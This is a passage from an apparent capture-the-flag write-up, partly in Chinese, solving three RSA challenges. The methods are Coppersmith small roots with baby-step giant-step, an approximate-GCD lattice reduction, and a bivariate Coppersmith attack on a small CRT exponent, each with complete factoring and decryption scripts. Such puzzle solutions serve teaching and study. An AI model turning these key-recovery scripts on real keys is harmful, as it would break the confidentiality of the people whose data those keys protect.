class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49</span></span><br><span class="line">c1 = <span class="number">0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kbits = int(1024*0.2247)</span></span><br><span class="line"><span class="string">m0 =  0x436f6d6d6f6e207072696d652052534120697320612076617269616e74206f66205253410000000000000000000000000000000000000000000000000000000000416e642074686520636f6d6d6f6e20666163746f722067206973206c61726765207072696d6520616e6420703d3267612b3120713d3267622b31</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = ((m0 + x*2**464)^e1) - c1</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">g1 = f.small_roots(X=2^kbits,beta=1)[0]</span></span><br><span class="line"><span class="string">print(g1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">g1 = <span class="number">1328458990599515056771144217738449144496664370133586446617480019409757</span></span><br><span class="line">v1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) % (<span class="number">2</span>*g1)</span><br><span class="line">u1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) // (<span class="number">2</span>*g1)</span><br><span class="line">left = (((<span class="number">2</span> * iroot(n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">2</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line">right = (((<span class="number">3</span> * iroot(<span class="number">2</span>*n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">4</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">b = <span class="built_in">pow</span>(<span class="number">114514</span>,<span class="number">2</span>*g1,n1)</span><br><span class="line">base = <span class="built_in">pow</span>(b,left,n1)</span><br><span class="line">D = iroot(right - left,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">step = <span class="built_in">pow</span>(b,D,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(D):</span><br><span class="line">    dic[base] = i</span><br><span class="line">    base = base * step % n1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;baby step ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">pow</span>(b,u1,n1)</span><br><span class="line">step = inverse(b,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(D):</span><br><span class="line">    <span class="keyword">if</span>(base <span class="keyword">in</span> dic):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ans found!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i,dic[base])</span><br><span class="line">        c = left+ i + D * dic[base]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    base = base * step % n1</span><br><span class="line"></span><br><span class="line">A = u1 - c</span><br><span class="line">B = v1 + c * <span class="number">2</span> * g1</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p1 = x*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q1 = y*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p1 * q1 == n1</span><br><span class="line">phi1 = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">c1 = <span class="number">0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5</span></span><br><span class="line">g2 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffd</span></span><br><span class="line">c2 = <span class="number">0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) // (<span class="number">2</span>*g2)</span><br><span class="line">B = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) % (<span class="number">2</span>*g2)</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p2 = x*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q2 = y*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p2 * q2 == n2</span><br><span class="line">phi2 = (p2-<span class="number">1</span>) * (q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-GCD"><a href="#strange-GCD" class="headerlink" title="strange_GCD"></a>strange_GCD</h2><blockquote><p><a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">paper</a></p></blockquote><p>给出了9组公钥，满足 $N&#x3D;P\cdot Q_i+R_i$ ，其中 $P$ 是444位、 $Q$ 是444位、 $R$ 是333位，那么显然只要求出 $P$ 、 $Q$ 其中一个即可，因为<br>$$<br>\begin{equation}\begin{split}<br>Q_1\cdot N_2-Q_2\cdot N_1&amp;&#x3D;Q_0(Q_1P+R_1)-Q_1(Q_0P+R_2) \\<br>&amp;&#x3D;Q_0R_1-Q_1R_0 \\<br>&amp;≈Q_{bits}\cdot P_{bits}<br>\end{split}\end{equation}<br>$$<br>所以我们构建这样的一个格子：<br>$$<br>M&#x3D;<br>\begin{bmatrix}<br>2^{P_{bits}} &amp; x_1 &amp; x_2 &amp; \cdots &amp;x_n \\<br>&amp;-x_0 \\<br>&amp;&amp;-x_0 \\<br>&amp;&amp;&amp;\ddots \\<br>&amp;&amp;&amp;&amp;-x_0<br>\end{bmatrix}<br>$$<br>所以一定存在一个向量 $\vec{v}&#x3D;(Q_0,Q_2,\cdots,Q_n)$ 满足 $\vec{v}\cdot M&#x3D;(Q_0·2^P_{bits},Q_0N_1-Q_1N_0,…,Q_0N_n-Q_nN_0)$ ，那么就能得到 $Q_{list}$ ，自然就能分解 $N$ ，正常解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = [<span class="number">8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216</span>, <span class="number">9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905</span>, <span class="number">7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900</span>, <span class="number">6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116</span>, <span class="number">5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729</span>, <span class="number">8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063</span>, <span class="number">6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426</span>, <span class="number">6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991</span>, <span class="number">5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062</span>]</span><br><span class="line">C = [<span class="number">800378461059400239726680783421062702546581299113618553895453491207714321944554499622887232532612118204284779120928524046451494597619154079853122057618867592408424421335915888671560524092660578952242621890439766919785431411789789232309134048322721650012432166587969915464252995890054635969469155870141839815222805619769926841873928532</span>, <span class="number">8685468246369062574820183134847029157229023858170863526469628501966638181721681547114662091162797572149161013458000532984909663639626346493828947027439012131912176125653717020650233650230608573276523862941298063827867869000918623143520066067119099918633173584693454642685133071154989133688921507896223776765538029556643440655490373815</span>, <span class="number">4635611296372235589362291842711945807825964919968727011796279830725567747087132786100965922682161492876463568645940638975728831156672106717718242995621775763972524561170035488180440169190421072680121175269363490806991700969253196228364471655905426168859215651384013432550900570720981720919343406680667172355882395426739478340888619526</span>, <span class="number">742099161415136628218807400531862454374875770332166710320711769923774839345990297388615457974047093967700994503615622499139058644697776431451063778211507061619987487339659448529973693084099004007650792690143707738139278995489030445825999666762580518420739517354868021396496747289677543653758101688499365196709600349831855157276274803</span>, <span class="number">4273006447766599851029197343910625305964779588947130545729882009677080459892767902139074897266046998378948193319329776150920821074305998905666368175737032487336505440974393061632257356697260043478850055918798196360043557336723402834256592984312957607731622934368169520289756716653736422872196593367101920308166527352079412344590114695</span>, <span class="number">1337615323422531101514598853478737615483725265103339849469231329210692205474781484172946466402355800190175297435923447189337380569240535257395618353403524999296122247241720498058900285176383928871155893061316083476812641934026019749574784965397208046520128690081232283708190247657782663414534596381371506499151016470118707739609022847</span>, <span class="number">6153442337491399463730666360630451953223069596225489087488144486112604050064388945200405772892415725900338512969888610774357818442533883395713661512978158729825590405567077341407532331228257558692149544940358814513930330757334104407683768945074261746314376336567331685071086776886141587264981001140113933152084084711732651014186070962</span>, <span class="number">3604640305526232611907645024550062043296875756707299105733076926046725900367109300556792007038226350415916164581084668832286944703572581980333135146219609212135443758296278947833224676930513359604019639508959092586550129343133801670578311053639151186604019506764426302411065588655525183584977810609190948096510237056027272167828516985</span>, <span class="number">2085633143403792178757363870459578017278494765962824809917819295576034993395441252397370078671500834434293581806342828037037877739374959864038090394888141183851040814572501861997433316552606005140700519616064369570511427453278726929921212633252656552135711332324923683242632912449218888750151556281762432994484741408165895663710356342</span>]</span><br><span class="line"></span><br><span class="line">M = [[<span class="number">1</span>&lt;&lt;<span class="number">334</span>]+N[<span class="number">1</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(N)-<span class="number">1</span>):</span><br><span class="line">    M.append([<span class="number">0</span>]*(i+<span class="number">1</span>)+[-N[<span class="number">0</span>]]+[<span class="number">0</span>]*(<span class="built_in">len</span>(N)-i-<span class="number">2</span>))</span><br><span class="line"><span class="comment"># print(M)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">M = [</span></span><br><span class="line"><span class="string">    [34996011596528190789960035633881941845650710894291398982812329702559247987190014771576210832368861184, 9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905, 7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900, 6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116, 5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729, 8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063, 6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426, 6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991, 5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062], </span></span><br><span class="line"><span class="string">    [0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">M = Matrix(ZZ,M)</span></span><br><span class="line"><span class="string">ans = M.LLL()[0]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ans = (<span class="number">4599191779324727072633164871296325902208765537352604303273175255453504312615500983406477011435819405305852059674048438016100668090246407849496908743817335622801573073136122188609246369046057261291320848819844418920893230598376364951805862565686868625621955071425273509220849374947161975251582041718784</span>, <span class="number">104098035638581595369723778375711537486830709046687306114704921816239533823901066113680320504395210089789340199402154288158599251547931748565815387310900885326892681968536308019715590493310968628489043723240348362149053110811668282038727688689374505928586075094912392544924601844136642390813222425809</span>, <span class="number">1102834391862716869946827309486981604079530638763397950737361315055931768373793498250981455412829162997772327814660070857951309312894092377859437366989526531813223828179941289064128320123411973263239142716310770401174174815638810202859450962632995611863799694649198457635953086959463939627719575381012</span>, <span class="number">753994729336183961852361196205654448289304004519434287316796470222521627865083763102251102951626213588497716067551706990220346381353586508856365765536744873026409087910505560761761024675350156647185336440841519838638415417607956807382719719007131540587566462617043290548957627028678429439567176392108</span>, -<span class="number">71708524916293121808333775279085691365967960919759775147913431698619192878017855212957980666806523648996086462040461850162074426038300683815953081712090679643498963889027587516137252350693864785830427057530016147319149926968346502476418390469709928547235995568090970863872980806983047965126211827423</span>, -<span class="number">1031944069356990593465028628753183012193322903943969718261363844383250576817774501764794204795605186147444430878687291921605373814843580367545369212301939780213941922732623750390324618190490307261983930269957183493345355165692496865409582827167136484989492550271511982793001065621702409883049993239817</span>, -<span class="number">1960547215826715829528682564527292643865866291188443591530567078511330848396016229325567425830200701694380104625201031396661972809519249893882531604307311435727272867042265335921514343841646164420771255718802644103398765492144311189111408831887333483581772033575516358581006829893858562536866631199694</span>, -<span class="number">1402335387560657499009395932180425308829816453818907356038567333645529829409747360872073366794556975860774421104509218449157997408918101385420918273310166387609041772539330599075043569860214109051067579537008367501834723009929827486300772678346407596106869832512579102180928086682172345775047825906065</span>, <span class="number">6492859743402427013224957526773612476031280993044690607784160057686880229209831538939045987606076773313125546427811186808795218860181360435151657439459135171731642225975056613348164819235317913083153227881911185574679170305638348499347070097938480392885289493284095645409615468925393679398090634630</span>)</span><br><span class="line">Q = []</span><br><span class="line">Q.append(ans[<span class="number">0</span>]&gt;&gt;<span class="number">333</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(ans)):</span><br><span class="line">    Q.append(-(ans[i]-Q[<span class="number">0</span>]*N[i])//N[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P = N[<span class="number">0</span>] // Q[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(C)):</span><br><span class="line">    flag += long_to_bytes(<span class="built_in">pow</span>(C[i],inverse(e,(P-<span class="number">1</span>)*(Q[i]-<span class="number">1</span>)),(P*Q[i])))[-<span class="number">5</span>:]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-CRT"><a href="#strange-CRT" class="headerlink" title="strange_CRT"></a>strange_CRT</h2><blockquote><p><a href="https://link.springer.com/content/pdf/10.1007%2F3-540-45708-9_16.pdf">paper</a></p></blockquote><p>二元的coppersmith，首先有 $e\cdot dq&#x3D;1\pmod{q-1}$ ，即 $e\cdot dq-k\cdot(q-1)-1&#x3D;0$ ，即 $e\cdot dq+k-1&#x3D;k\cdot q$ ，因为 $dq$ 只有40位，所以 $dq$ 和 $k$ 都比较小，我们设 $f(x,y)&#x3D;ex+y$ ，一定存在一个根 $(dq,k-1)$ ，我们使用 $x-shifted$ 方法构造方程组，</p><p>$$<br>B_P(4)&#x3D;<br>\begin{bmatrix}<br>N^2X^3 \\<br>eNX^3 &amp; -NX^2Y \\<br>e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\<br>e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3<br>\end{bmatrix}<br>$$<br>随后找到根 $(dq,k-1)$ ，即可分解 $N$ 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243</span></span><br><span class="line">e = <span class="number">5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087</span></span><br><span class="line">c = <span class="number">6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097</span></span><br><span class="line">m = <span class="number">114514</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">beta = 0.34</span></span><br><span class="line"><span class="string">delta = 0.02</span></span><br><span class="line"><span class="string">amplification = 2048</span></span><br><span class="line"><span class="string">X = int(pow(n,delta) * (5/2))</span></span><br><span class="line"><span class="string">Y = int(pow(n,(beta+delta)) * (5/2))</span></span><br><span class="line"><span class="string">M = []</span></span><br><span class="line"><span class="string">M.append([n*n*X*X*X,0,0,0])</span></span><br><span class="line"><span class="string">M.append([e*n*X*X*X,-n*X*X*Y,0,0])</span></span><br><span class="line"><span class="string">M.append([e*e*X*X*X,-2*e*X*X*Y,X*Y*Y,0])</span></span><br><span class="line"><span class="string">M.append([e*e*e*X*X*X,-3*e*e*X*X*Y,3*e*X*Y*Y,-Y*Y*Y])</span></span><br><span class="line"><span class="string">M = Matrix(M)</span></span><br><span class="line"><span class="string">A = M.LLL()[0]</span></span><br><span class="line"><span class="string">p = []</span></span><br><span class="line"><span class="string">p.append(A[0]//(X**3))</span></span><br><span class="line"><span class="string">p.append(A[1]//(X^2*Y))</span></span><br><span class="line"><span class="string">p.append(A[2]//(X*Y^2))</span></span><br><span class="line"><span class="string">p.append(A[3]//(Y^3))</span></span><br><span class="line"><span class="string">R.&lt;x,y&gt; = ZZ[]</span></span><br><span class="line"><span class="string">f = x**3*p[0] + x**2*y*p[1] + x*y**2*p[2] + y**3*p[3]</span></span><br><span class="line"><span class="string">f.factor()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(-1) * (144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717*x + 636751972323*y) * (22360612316620576265962363998986325309879295954423979763235633587165509772463851121464450246995467551277856854280313242339679743870302000793124620978436719868879086932947083203923324893801655101558128409321266258664105566594644972878236716985754511292295147466953475408456421662883470405599945529089115443773171753380747253399676451061853675376543473713650224588466737340581901289431253330538396922770846601154595827366651699780258116005162252520473266535156064285895366446187694020122502168871153774940666139567620938830703125690675687869510298889906793*x^2 + 